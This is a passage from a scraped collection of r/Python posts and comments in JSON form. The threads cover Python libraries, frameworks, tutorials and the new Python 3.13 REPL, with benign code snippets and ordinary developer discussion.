            "content": "Excel file 🤮 There is pandas.compare, which does what you say. That said, basically it sounds like you want to start unit testing: feeding example datasets through your data pipelines and seeing if they perform as you expect them to do. Suggest you look at a basic pytest and unit testing guide.",
            "replies": [
                {
                    "author": "arden13",
                    "score": "1",
                    "content": "Also, pandas has a unit testing component with assert statements. It feels a bit clunky at first but it's VERY helpful in debugging why your assert statement failed. Additionally you can grade the level of exact ess down. E.g. if a column is in a different order and you don't care you can turn it off."
                }
            ]
        },
        {
            "author": "Come-Follow-Me",
            "score": "4",
            "content": "Should check out the data Wrangler extension for vs code and Jupiter notebooks. Allows you to view the data quickly and easily and gives you stats about the table and columns to help narrow down issues. I find it annoying to filter and sort it on this but saves having to kick a file out."
        },
        {
            "author": "qckpckt",
            "score": "1",
            "content": "Libraries like Pandera, Great Expectations or Hypothesis are worth looking into. They all provide means of automating the process of data validation. I haven’t used them extensively myself, but even if you’re in a situation where you’re doing ad-hoc work, it might be worth looking into these tools as they may provide a nice concise framework for expressing the kind of checks you wish to perform on your data that would make the process more efficient than manual inspection. Also means that if ad-hoc work suddenly becomes required on a regular interval, you’ve already got the test cases written ready for integration into a CI/CD process."
        },
        {
            "author": "seanv507",
            "score": "0",
            "content": "i am with you on the excel for quick analysis i copy data frame to clipboard then paste into excel/google sheets easy to add check columns. obviously you have programmatic methods in python, but its often easier when you see the dataframe first",
            "replies": [
                {
                    "author": "rageagainistjg",
                    "score": "1",
                    "content": "Hey! Yea I gotta do some inspections to make sure that hopefully I have the correct python code to do as desired. It’s hard to blindly trust myself :). If I ever come up with a better solution to keep it all inside of vs code I’ll try to remember to hit you with a reply."
                }
            ]
        }
    ]
},
{
    "post_author": "Rawing7",
    "post_id": "1cnttw2",
    "post_score": "27",
    "post_time": "Thursday, May 9, 2024 at 1:20:45 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a React-like web framework for Python 👋",
    "media": [
        "https://github.com/rio-labs/rio/assets/41641225/44279406-0c2d-47e2-98b5-4582722054b2",
        "https://rio.dev/",
        "https://rio.dev/get-started",
        "https://github.com/rio-labs/rio",
        "https://discord.gg/7ejXaPwhyH"
    ],
    "post_content": "I'm Paul, one of the creators of Rio. Over the years I've tried many different established python GUI frameworks, but none of them really satisfied me. So I teamed up with a few like minded developers and spent the last few months to create our own framework. Rio is the result of this effort.\nWhat My Project Does\nRio is a brand new GUI framework that lets you create modern web apps in just a few lines of Python. Our goal is to simplify web and app development, so you can focus on the things you care about, instead of wasting countless hours on frustrating user interface details.\nWe do this by following the core principles of Python that we all know and love. Python is supposed to be simple and compact - and so is Rio. There is no need to learn any additional languages such as HTML, CSS or JavaScript, because all of the UI, Logic, Components and even layouting is done entirely in Python. There’s not even a distinction between front-end and back-end. Rio handles all of the communication transparently for you.\nKey Features\nFull-Stack Web Development: Rio handles front-end and backend for you. In fact, you won't even notice they exist. Create your UI, and Rio will take care of the rest.\nPython Native: Rio apps are written in 100% Python, meaning you don't need to write a single line of CSS or JavaScript.\nModern Python: We embrace modern Python features, such as type annotations and asynchrony. This keeps your code clean and maintainable, and helps your code editor help you out with code completions and type checking.\nPython Debugger Compatible: Since Rio runs on Python, you can connect directly to the running process with a debugger. This makes it easy to identify and fix bugs in your code.\nDeclarative Interface: Rio apps are built using reusable components, inspired by React, Flutter & Vue. They're declaratively combined to create modular and maintainable UIs.\nBatteries included: Over 50 builtin components based on Google's Material Design\nDemo Video\nTarget Audience\nWhether you need to build dashboards, CRUD apps, or just want to make a personal website, Rio makes it possible without any web development knowledge. Because Rio was developed from the ground up for Python programmers, it was designed to be concise and readable, just like Python itself.\nComparison\nRio doesn't just serve HTML templates like you might be used to from frameworks like Flask. In Rio you define components as simple dataclasses with a React/Flutter style build method. Rio continuously watches your attributes for changes and updates the UI as necessary.\nclass MyComponent(rio.Component):\n    clicks: int = 0\n\n    def _on_press(self) -> None:\n        self.clicks += 1\n\n    def build(self) -> rio.Component:\n        return rio.Column(\n            rio.Button('Click me', on_press=self._on_press),\n            rio.Text(f'You clicked the button {self.clicks} time(s)'),\n        )\n\napp = rio.App(build=MyComponent)\napp.run_in_browser()\nNotice how there is no need for any explicit HTTP requests. In fact there isn't even a distinction between frontend and backend. Rio handles all communication transparently for you. Unlike ancient libraries like Tkinter, Rio ships with over 50 builtin components in Google's Material Design. Moreover the same exact codebase can be used for both local apps and websites.\nWe Want Your Feedback!\nThe first alpha version of Rio is available on PyPi now:\npip install rio-ui\nrio new my-project --template tic-tac-toe\ncd my-project\nrio run\nDiscord\nGitHub\nTutorial\nWebsite\nLet us know what you think - any feedback, ideas, or even a helping hand are hugely welcome! Just hop on our Discord server and say hello!",
    "comments": [
        {
            "author": "P4nd4no",
            "score": "4",
            "content": "Hi, I’m also part of the rio team and I hope rio can help you with your projects! :) Currently, our main efforts are directed towards fine-tuning the rio concept, enhancing the overall user experience, and fostering a more conducive environment for community involvement. Additionally, we're striving to streamline the deployment processes by working towards seamless integration with hosting platforms, enabling users to deploy their Rio applications with just a single click."
        },
        {
            "author": "DryKoala7462",
            "score": "2",
            "content": "I've been diving deep into building interactive web apps with Dash. I'm curious about the differences between Dash and this framework called Rio. Are there any contrasting features?",
            "replies": [
                {
                    "author": "Sn3llius",
                    "score": "2",
                    "content": "Thanks for your attention. Hi I'm chris and also core developer at Rio. The main differences are: with Rio you don't need HTML and CSS for styling. in Rio you create your components mostly in classes, in Dash you will use a functional approach. Rio handles the client-server communication for you. Compared to Dash, Rio is a much newer framework and doesn't have a big community yet. There are many more differences, but I would appreciate it, if you could test it out and provide us with your feedback!"
                }
            ]
        },
        {
            "author": "scruttable",
            "score": "3",
            "content": "First off, the documentation is fantastic so far! I haven’t gotten into it too deep but I was able to install and start a project in a matter of minutes -most of which I spent upgrading my Python version haha. I can tell the docs are very clear and I’m excited about this framework. Can’t wait to really dig in.",
            "replies": [
                {
                    "author": "P4nd4no",
                    "score": "1",
                    "content": "Thanks for your positive feedback! :)"
                }
            ]
        }
    ]
},
{
    "post_author": "jpjacobpadilla",
    "post_id": "1clz4dy",
    "post_score": "73",
    "post_time": "Tuesday, May 7, 2024 at 3:49:12 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How Python Asyncio Works: Recreating it from Scratch",
    "media": [
        "https://jacobpadilla.com/articles/recreating-asyncio"
    ],
    "post_content": "Do you understand how asyncio works behind the scenes? Read this article and see how you can use Python generators to create your own version of asyncio, and then use the __await__ dunder method to use the async/await keywords to come full circle!\nhttps://jacobpadilla.com/articles/recreating-asyncio",
    "comments": [
        {
            "author": "spidLL",
            "score": "9",
            "content": "This is quality content!",
            "replies": [
                {
                    "author": "jpjacobpadilla",
                    "score": "2",
                    "content": "Thanks!"
                }
            ]
        },
        {
            "author": "Anonymous_user_2022",
            "score": "4",
            "content": "Those of you that find the article interesting, might also like David Beazley giving a talk on the same note back in 2019. https://www.youtube.com/watch?v=Y4Gt3Xjd7G8",
            "replies": [
                {
                    "author": "jpjacobpadilla",
                    "score": "2",
                    "content": "Thanks for the link - I remember watching a great talk on the GIL by him from that same channel!",
                    "replies": [
                        {
                            "author": "ParticularCod6",
                            "score": "1",
                            "content": "content for the next post? really loved this post",
                            "replies": [
                                {
                                    "author": "jpjacobpadilla",
                                    "score": "4",
                                    "content": "Thanks! Next post is on technical SEO, then probably one on the different PostgreSQL transaction isolation levels, then an article about the inner workings of FastAPI, and then I want to write a quick article about Python buffers."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "nekokattt",
            "score": "4",
            "content": "This is cool! Random question but is there a reason you use queue.Queue which is synchronized per thread rather than an unsynchronized container like collections.deque? Since it is running on a single thread. As a second question, is there any reason you chose time.time instead of time.perf_counter (since clock changes due to NTP could cause your sleep to terminate sooner than expected).",
            "replies": [
                {
                    "author": "jpjacobpadilla",
                    "score": "4",
                    "content": "Those are both great points! Both definitely make sense, I just didn’t think about them when writing the article :/"
                }
            ]
        },
        {
            "author": "conogarcia",
            "score": "1",
            "content": "This is really good. The other articles as well. You should send this to Pycoders Weekly.",
            "replies": [
                {
                    "author": "jpjacobpadilla",
                    "score": "1",
                    "content": "Glad you like the article. I never knew you could submit articles to them!"
                }
            ]
        },
        {
            "author": "Picatrixter",
            "score": "1",
            "content": "Thank you for the great content!"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Nice !"
        }
    ]
},
{
    "post_author": "RevolutionaryPen4661",
    "post_id": "1cnsgs1",
    "post_score": "5",
    "post_time": "Thursday, May 9, 2024 at 11:46:27 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "diskcache: This key-value store library is faster than Redis and Memcached 😮 (built by Grant Jenks)",
    "media": [
        "https://pypi.org/project/diskcache/",
        "https://github.com/grantjenks/python-diskcache"
    ],
    "post_content": "PYPI\n(From the README, Released Last Year, Edited by Grammarly)\nGithub\npip install diskcache\nThe cloud-based computing of 2024 puts a premium on memory. Gigabytes of space are left on disks as processes vie for memory. Memcached (and sometimes Redis) is used as a cache among these processes. Wouldn’t it be nice to leverage empty disk space for caching?\nDjango is Python’s most popular web framework and has several caching backends. Unfortunately, the file-based cache in Django is essentially broken. The culling method is random and large caches repeatedly scan a cache directory which slows linearly with growth. Can you allow it to take sixty milliseconds to store a key in a cache with a thousand items?\nIs it that fast?\nIn [1]: import pylibmc\nIn [2]: client = pylibmc.Client(['127.0.0.1'], binary=True)\nIn [3]: client[b'key'] = b'value'\nIn [4]: %timeit client[b'key']\n\n10000 loops, best of 3: 25.4 µs per loop\n\nIn [5]: import diskcache as dc\nIn [6]: cache = dc.Cache('tmp')\nIn [7]: cache[b'key'] = b'value'\nIn [8]: %timeit cache[b'key']\n\n100000 loops, best of 3: 11.8 µs per loop",
    "comments": [
        {
            "author": "rejectedlesbian",
            "score": "1",
            "content": "Does it say why? Like what do they do differently? Because redis threading model makes it close to optimal for the single threaded case (in terms of the number of locks/aromics needed) but it's nit the best in the multithreaded case and keydb showed that"
        },
        {
            "author": "rejectedlesbian",
            "score": "1",
            "content": "It's in process so you don't need to do sockets which makes it faster. This is a very nice use case. If u wanted it even faster I bet u can use c for a lot of itninstead of the raw python. I have been toying around with the idea of making a high preformance c/zig lib for python web apps. If this is something that's needed I may start working on it"
        }
    ]
},
{
    "post_author": "chonyyy",
    "post_id": "ggfwfw",
    "post_score": "2022",
    "post_time": "Saturday, May 9, 2020 at 5:00:44 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "AI basketball analysis web App and API",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "hareeshkrkollam",
            "score": "127",
            "content": "Hey, actually it seems so good. Congratulations. These will definitely encourage us to learn ML. Thanks for the inspiration."
        },
        {
            "author": "chonyyy",
            "score": "90",
            "content": "GitHub link: https://github.com/chonyy/AI-basketball-analysis Hi guys, this is the first AI project that I built with Python, TensorFlow, and OpenCV. I removed some features and built this demo site. It's a web App and API hosted with Flask. Please feel free to try it out. There are still many aspects that I can improve and extend. At this current stage, I would like to take as much feedback as possible. Any kind of thought is welcomed."
        },
        {
            "author": "booleanhooligan",
            "score": "14",
            "content": "Very cool I wouldn’t be surprised if this is already implemented in the nba"
        },
        {
            "author": "mdhurst",
            "score": "9",
            "content": "AI = Allen Iverson? Very ambitious!"
        },
        {
            "author": "[deleted]",
            "score": "17",
            "content": "Curious, how does it perform when it is an \"air ball\"?"
        },
        {
            "author": "Dontneedflashbro",
            "score": "4",
            "content": "As a sports fan I love this! It's amazing what you can do with python."
        },
        {
            "author": "anubhavd677",
            "score": "3",
            "content": "Could you please tell me how long did you take to build this awesome project and from how long have you been into AI. Thanks in advance."
        },
        {
            "author": "ApoorvWatsky",
            "score": "3",
            "content": "What data did you use to train your model? Is it publicly available or you created it on your own?"
        },
        {
            "author": "jpm2892",
            "score": "3",
            "content": "Could someone please explain to me how can you get information about the location of the ball in the video? What library or framework or knowledge is used? How do you \"read\" pictures in python? It's something I've always been curious about."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cputlh",
    "post_score": "5",
    "post_time": "Sunday, May 12, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Sad_Turnover5567",
            "score": "3",
            "content": "Trying to get back into learning. Haven’t been doing it in a while, been so busy recently, but not anymore. Want to do more automation things for kali tools."
        },
        {
            "author": "Pedro41RJ",
            "score": "2",
            "content": "I am coding a game. It will be cheap. It uses pygame and random. It is kind of a puzzle."
        },
        {
            "author": "brennancurrier",
            "score": "1",
            "content": "Texture converter cuz I don’t like the current ones available. Haven’t decided what gui framework to use yet. Either dearpygui or tkinter/bootstrap. I just also need to find a module to help convert them from dds to tga/bmp/png and back from tga/bmp/png to dds. Was gonna have it batch convert all textures in a directory at a time and have possibly a tagging system of some sort or something so if I really wanted to I could automate the resizing of the textures too usually from 4k down to 3k/2k/1k"
        },
        {
            "author": "atmine",
            "score": "1",
            "content": "Working on my hobby 1D roguelike game. Basic combat is kinda working, got to give monsters some brains next!"
        },
        {
            "author": "OwnTension6771",
            "score": "1",
            "content": "Fixing some form conversion templates and report generators."
        },
        {
            "author": "Super-Government6796",
            "score": "1",
            "content": "I'm rewritting some numpy scipy simulation in Jax , so hopefully I will overcome some speed and memory issues, a bit worried about how much work it will take but I fell I'm halfway there"
        },
        {
            "author": "CarlosPerez9933",
            "score": "1",
            "content": "Working generate a PlantUML ER, with xsd schema as source"
        },
        {
            "author": "Molkiu",
            "score": "1",
            "content": "https://hacker-news-lake-phi.vercel.app/ I'm redesigning the Hacker News website. So far, I've added colors that correspond to the average sentiment of the comments on the link, an infinite scroll, and the ability to view the comments on a link. I haven't put in too many hours yet (I started this Thursday night), and I plan to add things as I see fit in my free time, so if you have any ideas or advice to give, don't hesitate to share them."
        },
        {
            "author": "antonpetrov145",
            "score": "1",
            "content": "Trying to learn how to make an image classifier model with keras."
        }
    ]
},
{
    "post_author": "jmacey",
    "post_id": "1cmg5fv",
    "post_score": "3",
    "post_time": "Tuesday, May 7, 2024 at 7:32:14 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Build tool support for PySide / PyQt\n",
    "media": [],
    "post_content": "Just interested in how people approach this, typically I just use VSCode or QtCreator to build simple projects. However I now want to automate some of the build process such as running uic, and rcc.\nI've tried to use CMake but can't seem to get it to work without a lot of custom scripting (for example the AUTOUIC etc functions need c++ projects), can't see any info on running uic in QtCreator (which would be ideal but python support is really just an after thought).\nI could write some Makefiles but this is a little ad-hoc and also confuses the IDE's (and at the end of the day I want a simple process for my students to use and I already teach cmake for C++ dev).\nSo I guess my questions are what workflows do people use, can you recommend any tools to help, or do you just have a per project script to run uic and rcc?\n(I may cross post this in both qt and python subreddits as I'm not sure where it fits best)",
    "comments": [
        {
            "author": "BlindGibbon",
            "score": "3",
            "content": "At my work, we just have a script that globs for the ui files and runs the pyuic tool on it. We also have a pre-commit hook to make sure no commits are made with out-of-date ui files. If you want to automate the process, you could set up a preLaunchTask in VSCode (I don’t know if there’s an equivalent in QtCreator). You could also consider using the QUiLoader class to load the ui files directly at runtime.",
            "replies": [
                {
                    "author": "jmacey",
                    "score": "1",
                    "content": "thanks, I think I need to do the script approach, the QUiLoader is sometimes an issue especially when using Maya as there are some weird issues with PySide loading and you need to add extra code. I'm trying to make it as simple as possible."
                }
            ]
        },
        {
            "author": "riklaunim",
            "score": "1",
            "content": "maybe a docker image if you want it to be in a more share-able format?",
            "replies": [
                {
                    "author": "jmacey",
                    "score": "1",
                    "content": "This is more automating the build process, for example I want to run uic and rcc before running my program, so it's not a deployment process. I have discovered that pyside6-project can do most of what I need, unfortunatly I mainly use PySide2 / PyQt5 at present."
                }
            ]
        },
        {
            "author": "mikat7",
            "score": "1",
            "content": "What about qmake?",
            "replies": [
                {
                    "author": "jmacey",
                    "score": "1",
                    "content": "think qmake will give the same issues as cmake (and is also no being deprecated), it will work well for C++ but trying to get it to work with python is a pain. I think my main limiting factor at present is I need to use PySide2 (as this is what a lot of the 3rd party tools I develop for use maya / houdini) so I need that ecosystem."
                }
            ]
        },
        {
            "author": "ExdigguserPies",
            "score": "1",
            "content": "There is a plugin for VSCode called Qt for Python that automates ui, rc file compilation and a bunch of other things. When I'm happy with a project version I use nuitka to build to an exe."
        },
        {
            "author": "Longjumping-Fee278",
            "score": "1",
            "content": "Can’t you use proton native front end and Django backend"
        }
    ]
},
{
    "post_author": "Cool-Nefariousness76",
    "post_id": "1cpqh34",
    "post_score": "7",
    "post_time": "Saturday, May 11, 2024 at 11:30:37 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Library for automatic Cython 3.0 code annotations generation.",
    "media": [
        "https://github.com/nucccc/markarth"
    ],
    "post_content": "Hi everybody,\nover the last year I've been developing a library that adds some Cython 3.0 annotations to existing python code.\nWhat My Project Does:\nFor example if it sees a for i in range(): in a function it recognizes i as an integer and adds a i = cython.declare(cython.int)line at the beginning of the function.\nIt actually uses the built-in ast module under the hood for parsing, I found it a super useful library!\nTarget Audience:\nIt is a side project I made mainly for fun. I don't know if it can be of interest to anybody, or if it could have some potential utility.\nComparison:\nI did not find anything similar. There are a lot of very cool projects like mypyc for example, but nothing that does this tiny little code generation specific to Cython.\nThe link to the repository is here:\nhttps://github.com/nucccc/markarth",
    "comments": [
        {
            "author": "cediddi",
            "score": "1",
            "content": "Curious why you used cython declare rather than type annotation syntax.",
            "replies": [
                {
                    "author": "Cool-Nefariousness76",
                    "score": "1",
                    "content": "Sincerely I don't of any factual difference between the two expressions. I just picked one :). If I was aware of any significant advantage then I would evaluate a change"
                }
            ]
        },
        {
            "author": "rejectedlesbian",
            "score": "1",
            "content": "So this is a python compiler?",
            "replies": [
                {
                    "author": "Cool-Nefariousness76",
                    "score": "1",
                    "content": "Not at all. There are programs (Cython, mypyc) which tranpile python code directly into C/C++ to obtain a C Extension, which can then be imported into python. My idea was just to add some annotation that could benefit a Cython transpilation in terms of execution performance of the generated C Extension. I'll try to explain up to my knowledge: What Cython does is basically taking python code, transpiling it into C/C++ and then obtain an extension out of it. It enables the possibility to add types among the original python codelines, so as to obtain better performances. For example, if I was to write: for i in range(9000): in the generated C code the i variable would be treated as a Py_Object, with all the related overhead. But Cython allows one to specify that i shall be treated as a C int, for example by using the cython syntax cdef int i or also with Cython 3.0 i = cython.declare(cython.int). Then in the transpiled C code (cool thing is that you can actually inspect that transpiled C code) one will see that that range becomes something way faster like for(int i = 0; i < 9000; ++i). This is already done by Cython, but one should somehow write that line to tell Cython \"hey, treat that i variable like a C integer, not a Python object\". I just wanted to make a library the adds these lines to improve the performance of cythonized code. I hope I was correct and clear."
                }
            ]
        }
    ]
},
{
    "post_author": "treyhunner",
    "post_id": "1cnf0p5",
    "post_score": "308",
    "post_time": "Wednesday, May 8, 2024 at 11:50:03 PM GMT+3",
    "flair_text": "News",
    "post_title": "The new REPL in Python 3.13.0 beta 1",
    "media": [
        "https://treyhunner.com/2024/05/my-favorite-python-3-dot-13-feature/"
    ],
    "post_content": "Python 3.13.0 beta 1 was released today.\nThe feature I'm most excited about is the new Python REPL.\nHere's a summary of my favorite features in the new REPL along with animated gifs.\nThe TLDR:\nSupport for block-leveling history and block-level editing\nPasting code (even with blank lines within it) works as expected now\nTyping exit will exit (no more Use exit() or Ctrl-D (i.e. EOF) to exit message)",
    "comments": [
        {
            "author": "TheBear8878",
            "score": "201",
            "content": "Pasting code (even with blank lines within it) works as expected now My god..... I thought I'd die before this was ever implemented",
            "replies": [
                {
                    "author": "caks",
                    "score": "42",
                    "content": "Single reason why I just automatically install ipython in any dev environment I create.",
                    "replies": [
                        {
                            "author": "dontworryimnotacop",
                            "score": "5",
                            "content": "Try bpython and pudb! I personally like their autocompletion, coloring, and TUIs better than iPython/ipdb.",
                            "replies": [
                                {
                                    "author": "caks",
                                    "score": "2",
                                    "content": "Thanks will do!"
                                },
                                {
                                    "author": "Rocket089",
                                    "score": "2",
                                    "content": "pt(i)python ftw!"
                                }
                            ]
                        },
                        {
                            "author": "Log2",
                            "score": "3",
                            "content": "If anything they should just have adopted ipython."
                        }
                    ]
                },
                {
                    "author": "ProfessorPhi",
                    "score": "7",
                    "content": "I've been using ipython forever, when I end up without it my hands stop working."
                }
            ]
        },
        {
            "author": "fortunatefaileur",
            "score": "80",
            "content": "To unbury the lede - it has adopted pypy’s repl: https://x.com/pypyproject/status/1786705942438179279"
        },
        {
            "author": "aes110",
            "score": "56",
            "content": "Great post, appreciate the gifs Ultimately I don't see any reason to use the basic repl over ipython, but it's nice to have it when that's not available",
            "replies": [
                {
                    "author": "caks",
                    "score": "14",
                    "content": "It's good to have a good REPL if you're debugging in a production environment. Sometimes I fire up a REPL to test some stuff in an environment I can't install ipython"
                },
                {
                    "author": "Zomunieo",
                    "score": "13",
                    "content": "For new Python users one of the first things they may try is pasting code into the REPL."
                }
            ]
        },
        {
            "author": "PythonistaBarista",
            "score": "15",
            "content": "oh my god that block level history is gonna be amazing"
        },
        {
            "author": "krypt3c",
            "score": "28",
            "content": "I'm exited to just be able to type exit to quit. I always seem to make this mistake",
            "replies": [
                {
                    "author": "Ph0X",
                    "score": "8",
                    "content": "I'm curious how it's implemented. Without looking, I wonder if the old one had Use exit() or Ctrl-D (i.e. EOF) to exit as the __repr__ for the exit function. Maybe now the __repr__ just straight up calls sys.exit() instead? EDIT: Looks like my first guess was correct: https://github.com/python/cpython/blob/2f4db5a04d6fa7ba5c1c6b82b482dd7ca48f3382/Lib/code.py#L330 new repl has \"special\" commands that override the interpreter: https://github.com/python/cpython/blame/2f4db5a04d6fa7ba5c1c6b82b482dd7ca48f3382/Lib/_pyrepl/simple_interact.py#L60 kinda ugly imo"
                }
            ]
        }
    ]
},
{
    "post_author": "Dry_Raspberry4514",
    "post_id": "1cn8zg3",
    "post_score": "34",
    "post_time": "Wednesday, May 8, 2024 at 7:34:36 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Who is using quart framework for microservices?",
    "media": [
        "https://quart.palletsprojects.com/"
    ],
    "post_content": "I am using quart framework (https://quart.palletsprojects.com) for a number of microservices in a SaaS application. However, I hardly hear anything about this framework on any social media platform which seems to be dominated by FastAPI. Also I'm unable to find which all projects/companies are using this framework. All this is leading to anxiety around the future of this project.\nAre there any well known projects / companies which are using this framework for microservices?",
    "comments": [
        {
            "author": "the_hoser",
            "score": "33",
            "content": "I've never even heard of it until this post.",
            "replies": [
                {
                    "author": "Dry_Raspberry4514",
                    "score": "3",
                    "content": "I'm not surprised at your comment. It seems I need to do the marketing for this framework :-) I switched from flask to quart when I was looking for something which has been designed from scratch as async first framework and I liked it very much. Recently looked into FastAPI as well but found quart more useful and easy easier for someone who would like to migrate away from flask for async.",
                    "replies": [
                        {
                            "author": "EternityForest",
                            "score": "2",
                            "content": "I'm moving my FOSS automation server to Quart right now after ten years on CherryPy. I choose it largely because it's a fairly easy migration path thanks to still being request context based, but also because of it's close ties with Flask. I assume it won't just vanish in a few years if Pallets is in on it, and it mostly just reimplements flask, which l like and more importantly, everyone else seems to like too, it's a standard everyone knows. In the process I discovered just how much CherryPy's implicitly class navigation routing was holding me back and how nice the explicit model is especially when you have a partly plugin based architecture. I also really like that it has some limited support for synchronous handlers, and helpers to do sync tasks, so gradual migration is possible. Some of what I used to do with Cherrypy tools I now do with ASGI Middleware, and I love how easy it is to write those, and how you can compose smaller ASGI apps with dispatchers. But.... I still feel some of the concerns you mention, and wonder if I should have used FastAPI, because it seems like the popular choice."
                        },
                        {
                            "author": "ParticularCod6",
                            "score": "2",
                            "content": "what parts did you find more useful?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "TheSwoleITGuy",
            "score": "20",
            "content": "I think a relevant question is: with the likes of Flask, Django and FastAPI - which all have positive track records, significant communities and all but guaranteed support for years to come - what problem is Quart solving that those do not which led you to select it?",
            "replies": [
                {
                    "author": "Dry_Raspberry4514",
                    "score": "3",
                    "content": "Quart is an async first framework and Flask didn't have support for async when I looked into it last time few years back. That was the whole reason to go for Quart. Migration from Flask to Quart is as simple as replacing flask word with quart word and using async in front of function definitions. I don't think migration from Flask to FastAPI is this much simple. Having worked with Pydantic extensively, tight integration of it with fastapi can cause issues IMO. For example, whenever I persist a business object in the DB, we generate id and populate some other fields (e.g. tenant id, user id etc) before initializing the pydantic model class to trigger the validation where all these parameters are marked as mandatory. I believe in case of FastAPI you need to mark such fields as optional as it converts request body to Pydantic model class object automatically. This may result in NOT triggering validation errors until business object is persisted in the DB. Other thing which I found little strange is supporting before_request using dependency injection which will pollute function inputs parameters. This one may not be an issue for someone who is starting with FastAPI directly instead of migrating from Flask to FastAPI."
                }
            ]
        },
        {
            "author": "gscalise",
            "score": "5",
            "content": "I used Quart when I had to build a service endpoint that had to handle multiple streaming requests concurrently, relaying the streams to an internal service and streaming the results back to the client. It would have been extremely inefficient to use a non async-capable framework, and it was super easy to adopt since most Flask middlewares and decorators are either supported or ported."
        },
        {
            "author": "stetio",
            "score": "5",
            "content": "Hello u/Dry_Raspberry4514 thank you for using Quart! I think the reason you don't hear much about Quart is that I'm terrible at marketing. All this is leading to anxiety around the future of this project. I think Quart's future is very rosy; as of 2 years ago Quart joined Pallets who maintain Flask with the stated aim of merging the frameworks. Whilst this aim is tricky Quart now has a dedicated and funded group as its custodian. I should also point out that Quart is a fairly mature async project now - it started in 2017 and is mostly based on Werkzeug (and parts of Flask) that have been maintained since ~2010. dominated by FastAPI I'm often asked about how Quart compares with FastAPI so I wrote this blog post. You may not be aware of Quart-Schema which provides OpenAPI autogenerated documentation and validation using Pydantic, msgspec, or attrs. Thank you for the comments saying how it made for an easy Flask -> async transition. This was the driving motivation for Quart."
        },
        {
            "author": "devbym",
            "score": "2",
            "content": "I have been aware of it, not having built anything with it yet. I've read that it is fairly similar to Flask but better support for async operations."
        },
        {
            "author": "tehsilentwarrior",
            "score": "2",
            "content": "I am using Nameko for a fairly large project and I dont hear anything about it either. Which is a shame"
        },
        {
            "author": "gyarbij",
            "score": "2",
            "content": "I actually switched from Flask to Quart for (https://doroad.ai) and the most important thing for me to make the move was how simple it was, I was my own biggest lazy hurdle in the transition by not updating somethings to async which is to say it was super easy to switch.",
            "replies": [
                {
                    "author": "Dry_Raspberry4514",
                    "score": "2",
                    "content": "I, too, chose Quart due to exact same reason."
                }
            ]
        }
    ]
},
{
    "post_author": "flights4ever",
    "post_id": "iqer5r",
    "post_score": "2011",
    "post_time": "Friday, September 11, 2020 at 2:17:20 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Very nice 👍",
    "media": [
        "https://www.reddit.com/r/Hacking_Tutorials/comments/ipuo1v/python_cheat_sheet/",
        "https://www.reddit.com/r/Hacking_Tutorials/"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "brews",
            "score": "88",
            "content": "Pro tip: Don't write open-ended try/excepts like this cheat sheet does. It's a huge smelly anti-pattern. https://realpython.com/the-most-diabolical-python-antipattern/ Seriously. It will fuck your shit up.",
            "replies": [
                {
                    "author": "gohanshouldgetUI",
                    "score": "13",
                    "content": "Is realpython a good website to refer to and learn from?",
                    "replies": [
                        {
                            "author": "eambertide",
                            "score": "12",
                            "content": "RealPython is my go to website"
                        },
                        {
                            "author": "nerdponx",
                            "score": "7",
                            "content": "Yes"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "4",
                    "content": "I've seen a ton of silent failures in Prod code because of that. I've started breaking out 'expected' exceptions, like ValueErrors when grabbing inputs, etc. with proper handling, and then ending it with a big catch-all that screams a bunch of alarms and emails the stack trace to a support distro list."
                },
                {
                    "author": "CatnipJuice",
                    "score": "2",
                    "content": "you mean you need to put a finally/else down there?",
                    "replies": [
                        {
                            "author": "fiddle_n",
                            "score": "17",
                            "content": "I believe that they mean that you should catch specific exceptions rather than catching every exception. So instead of try: ... except: ... it should be: try: ... except ValueError: ..."
                        }
                    ]
                },
                {
                    "author": "GiantElectron",
                    "score": "1",
                    "content": "> Seriously. It will fuck your shit up. No it won't. and it's not an antipattern. It's an antipattern if you don't know what you are doing and you are just using it as a catch all. I can guarantee that if you have a plugin system in your application, and plugin writing is in the hands of your users, and you want your application not to crash but instead tell the users \"yo, your plugin is borked\" you _absolutely_ want that try except.",
                    "replies": [
                        {
                            "author": "brews",
                            "score": "3",
                            "content": "That's fine - as long as you're dealing with the exception and not simply pass. Unfortunately, that rarely how you see this used and that's not how it was shown on the cheat sheet."
                        }
                    ]
                }
            ]
        },
        {
            "author": "KodenameKoala",
            "score": "22",
            "content": "For the newyear_2020 object shouldn’t it be representing December 31, 2020 not December 25?"
        },
        {
            "author": "quotemycode",
            "score": "18",
            "content": "You should catch each error you expect, never do try/ catch the way its shown here."
        },
        {
            "author": "WearyConversation",
            "score": "18",
            "content": "Who the heck uses 1 for a variable name? Sorry, I meant I. Wait, no, l I meant l. It's even in explicitly mentioned in PEP 8."
        },
        {
            "author": "emc87",
            "score": "55",
            "content": "r/learnpython"
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "How is this data science, it’s just pure python"
        },
        {
            "author": "SAVE_THE_RAINFORESTS",
            "score": "5",
            "content": "Data science cheat sheet Only has basic Python commands I've written a program that reverses a given array so I'm a data scientist."
        },
        {
            "author": "MewthreeWasTaken",
            "score": "12",
            "content": "One trick that I really like is dictionary comprehension. You can for example do: {value: key for key, value in dictionary.items()} To invert the keys and values in a dictionary"
        }
    ]
},
{
    "post_author": "TokenChingy",
    "post_id": "1cnr0g3",
    "post_score": "23",
    "post_time": "Thursday, May 9, 2024 at 10:01:33 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Calculating Virtual Cycling Power With Python",
    "media": [
        "https://jasonlei.com/calculating-virtual-cycling-power"
    ],
